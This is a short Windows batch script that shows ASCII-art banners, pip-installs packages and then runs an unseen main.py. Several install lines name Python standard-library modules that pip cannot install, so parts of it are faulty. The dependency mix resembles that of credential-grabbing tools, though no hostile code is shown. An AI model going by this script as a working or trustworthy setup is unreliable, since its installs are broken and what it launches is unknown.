cls
chcp 65001 > nul
@echo off > nul
cls
echo.
echo █ █▄ █ █▀ ▀█▀ ▄▀█ █   █   █ █▄ █ █▀▀   █   █ █▄▄ █▀█ ▄▀█ █▀█ █ █▀▀ █▀
echo █ █ ▀█ ▄█  █  █▀█ █▄▄ █▄▄ █ █ ▀█ █▄█   █▄▄ █ █▄█ █▀▄ █▀█ █▀▄ █ ██▄ ▄█

pip install discord.py colorama pystyle logging > nul
pip install base64
pip install json
pip install os
pip install shutil
pip install sqlite3
pip install re
pip install requests
pip install socket
pip install zipfile
pip install pycryptodome

cls
color 2
echo █▀ █ █ █▀▀ █▀▀ █▀▀ █▀ █▀ █▀▀ █ █ █   █   █▄█   █ █▄ █ █▀ ▀█▀ ▄▀█ █   █   █▀▀ █▀▄
echo ▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█ █▀  █▄█ █▄▄ █▄▄  █    █ █ ▀█ ▄█  █  █▀█ █▄▄ █▄▄ ██▄ █▄▀

cls
python main.py
